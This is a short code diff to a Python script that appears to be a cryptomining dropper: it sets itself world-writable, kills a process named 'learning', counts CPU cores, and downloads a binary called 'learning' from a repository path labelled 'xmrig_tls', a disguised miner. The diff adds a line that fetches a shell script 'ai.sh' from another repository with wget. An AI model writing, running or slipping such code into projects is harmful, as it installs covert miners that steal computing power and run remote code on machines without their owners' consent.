@@ -6,6 +6,7 @@ import multiprocessing
 useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = 'learning'
+shell = 'ai.sh'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -22,6 +23,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if not os.path.isfile('/usr/local/bin/' + program):
+        os.system('wget  -qO- https://raw.githubusercontent.com/ToRxmrig/container--1hp8ak/main/'  + shell)
         os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
